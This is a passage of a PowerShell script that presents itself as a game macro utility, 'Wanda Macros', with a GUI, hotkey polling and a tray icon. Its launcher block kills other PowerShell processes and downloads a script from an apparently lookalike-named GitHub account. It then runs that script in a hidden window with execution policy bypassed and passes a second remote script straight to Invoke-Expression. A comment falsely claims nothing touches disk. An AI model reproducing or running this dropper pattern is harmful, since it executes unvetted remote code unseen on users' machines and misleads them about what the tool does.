                    $nud = New-Object System.Windows.Forms.NumericUpDown
                    $nud.Size        = New-Object System.Drawing.Size($nudW, 28)
                    $nud.Location    = New-Object System.Drawing.Point(($contentW - $nudW - 8), $iy)
                    $nud.Minimum     = 0
                    $nud.Maximum     = 1000
                    $nud.Value       = $script:delays[$item.Key]
                    $nud.BackColor   = $baseBg
                    $nud.ForeColor   = $textClr
                    $nud.BorderStyle = "FixedSingle"
                    $nud.Font        = New-Object System.Drawing.Font("Segoe UI", 10)
                    $nud.TextAlign   = [System.Windows.Forms.HorizontalAlignment]::Center
                    $nud.Tag         = $item.Key
                    $nud.Add_ValueChanged({
                        $script:delays[$this.Tag] = [int]$this.Value
                    })
                    $card.Controls.Add($nud)
                    $iy += 32
                }
                $iy += 6
            }

            $cy += $cardH + 12
        }

        $cy += 6
        $vLbl = New-Object System.Windows.Forms.Label
        $vLbl.Text      = "v0.4 — Custom"
        $vLbl.ForeColor = $surface0
        $vLbl.Font      = New-Object System.Drawing.Font("Segoe UI", 8)
        $vLbl.AutoSize  = $false
        $vLbl.Size      = New-Object System.Drawing.Size($contentW, 20)
        $vLbl.Location  = New-Object System.Drawing.Point($pad, $cy)
        $vLbl.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
        $scroll.Controls.Add($vLbl)

        $f.Add_FormClosing({ param($s,$e); $e.Cancel = $true; $s.Hide() })
        return $f
    }

    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 50
    $timer.Add_Tick({
        try {
            $state = [Win32]::GetAsyncKeyState([Win32]::VK_HOME)
            $isDown = ($state -band 0x8000) -ne 0
            if ($isDown -and -not $script:homeWasDown) {
                if ($null -eq $script:guiForm -or $script:guiForm.IsDisposed) {
                    $script:guiForm = New-BrxtwurstForm
                }
                if ($script:guiForm.Visible) {
                    $script:guiForm.Hide()
                } else {
                    $script:guiForm.Show()
                    $script:guiForm.Activate()
                }
            }
            $script:homeWasDown = $isDown

            if (($script:listening -ge 0 -or $script:listeningCustom -ne "") -and $script:guiForm -and -not $script:guiForm.IsDisposed -and $script:guiForm.Visible) {
                $mb  = ([Win32]::GetAsyncKeyState(0x04) -band 0x8000) -ne 0
                $xb1 = ([Win32]::GetAsyncKeyState(0x05) -band 0x8000) -ne 0
                $xb2 = ([Win32]::GetAsyncKeyState(0x06) -band 0x8000) -ne 0
                if ($mb  -and -not $script:mbWas)  {
                    if ($script:listening -ge 0) { Finish-Listen "Mouse3" }
                    elseif ($script:listeningCustom -ne "") { Finish-ListenCustom "Mouse3" }
                }
                if ($xb1 -and -not $script:xb1Was) {
                    if ($script:listening -ge 0) { Finish-Listen "Mouse4" }
                    elseif ($script:listeningCustom -ne "") { Finish-ListenCustom "Mouse4" }
                }
                if ($xb2 -and -not $script:xb2Was) {
                    if ($script:listening -ge 0) { Finish-Listen "Mouse5" }
                    elseif ($script:listeningCustom -ne "") { Finish-ListenCustom "Mouse5" }
                }
                $script:mbWas  = $mb
                $script:xb1Was = $xb1
                $script:xb2Was = $xb2
            } else {
                $script:mbWas  = $false
                $script:xb1Was = $false
                $script:xb2Was = $false
            }

            if ($script:listening -lt 0 -and $script:listeningCustom -eq "") {
                if ($script:btnStates[0] -and $script:btnKeys[0] -ne "None") {
                    $vk0 = Get-VKCode $script:btnKeys[0]
                    if ($vk0 -gt 0) {
                        $cur0 = ([Win32]::GetAsyncKeyState($vk0) -band 0x8000) -ne 0
                        if ($cur0 -and -not $script:triggerWas[0]) { Run-HitCrystal-OnPress }
                        if ($cur0) { Run-HitCrystal-WhileHolding }
                        $script:triggerWas[0] = $cur0
                    }
                } else { $script:triggerWas[0] = $false }

                if ($script:btnStates[1] -and $script:btnKeys[1] -ne "None") {
                    $vk1 = Get-VKCode $script:btnKeys[1]
                    if ($vk1 -gt 0) {
                        $cur1 = ([Win32]::GetAsyncKeyState($vk1) -band 0x8000) -ne 0
                        if ($cur1 -and -not $script:triggerWas[1]) { Run-SingleAnchor }
                        $script:triggerWas[1] = $cur1
                    }
                } else { $script:triggerWas[1] = $false }

                if ($script:btnStates[2] -and $script:btnKeys[2] -ne "None") {
                    $vk2 = Get-VKCode $script:btnKeys[2]
                    if ($vk2 -gt 0) {
                        $cur2 = ([Win32]::GetAsyncKeyState($vk2) -band 0x8000) -ne 0
                        if ($cur2 -and -not $script:triggerWas[2]) { Run-DoubleAnchor }
                        $script:triggerWas[2] = $cur2
                    }
                } else { $script:triggerWas[2] = $false }
            }
        } catch {}
    })
    $timer.Start()

    $tray = New-Object System.Windows.Forms.NotifyIcon
    $tray.Text    = "Wanda Macros - Home to toggle"
    $tray.Visible = $true

    $bmp = New-Object System.Drawing.Bitmap(16,16)
    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
    $gfx.Clear([System.Drawing.ColorTranslator]::FromHtml("#cba6f7"))
    $gfx.Dispose()
    $tray.Icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())

    $menu = New-Object System.Windows.Forms.ContextMenuStrip
    $exit = New-Object System.Windows.Forms.ToolStripMenuItem("Exit Wanda Macros")
    $exit.Add_Click({
        $timer.Stop()
        $tray.Visible = $false; $tray.Dispose()
        if ($script:guiForm -and -not $script:guiForm.IsDisposed) { $script:guiForm.Dispose() }
        [System.Windows.Forms.Application]::Exit()
    })
    $menu.Items.Add($exit) | Out-Null
    $tray.ContextMenuStrip = $menu
    $tray.Add_DoubleClick({
        if ($null -eq $script:guiForm -or $script:guiForm.IsDisposed) {
            $script:guiForm = New-BrxtwurstForm
        }
        if ($script:guiForm.Visible) { $script:guiForm.Hide() }
        else { $script:guiForm.Show(); $script:guiForm.Activate() }
    })

    $script:guiForm = New-BrxtwurstForm

    $appCtx = New-Object System.Windows.Forms.ApplicationContext
    [System.Windows.Forms.Application]::Run($appCtx)

} else {
    # -----------------------------------------------------------------------
    # Launcher block — fully fileless, nothing ever touches disk
    # -----------------------------------------------------------------------
    $ErrorActionPreference = 'Stop'

    try {
        $myPid = $PID
        Get-Process | Where-Object {
            $_.Id -ne $myPid -and
            $_.ProcessName -match "powershell|pwsh"
        } | ForEach-Object {
            try {
                $cmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
                if ($cmdLine -and $cmdLine -match "WandaMacros_MacroMode") {
                    Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                }
            } catch {}
        }

        $rawUrl  = "https://raw.githubusercontent.com/HadronColIision/PowershellScripts/refs/heads/main/HabibiModAnalyzer.ps1"
        $srcText = Invoke-RestMethod $rawUrl

        $tmpFile = [System.IO.Path]::GetTempFileName() + ".ps1"
        $childCode = '$env:WandaMacros_MacroMode = "1"' + "`n" +
                     '$MacroMode = [System.Management.Automation.SwitchParameter]::Present' + "`n" +
                     $srcText
        [System.IO.File]::WriteAllText($tmpFile, $childCode, [System.Text.Encoding]::UTF8)

        Start-Process -WindowStyle Hidden `
            -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
            -ArgumentList "-ExecutionPolicy Bypass -STA -NoProfile -File `"$tmpFile`""

        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
        Invoke-Expression (Invoke-RestMethod "https://raw.githubusercontent.com/HadronCollision/PowershellScripts/refs/heads/main/HwidChecker.ps1")

    } catch {
        Write-Host "ERROR: $_" -ForegroundColor Red
        Read-Host "Press Enter to exit"
    }
}
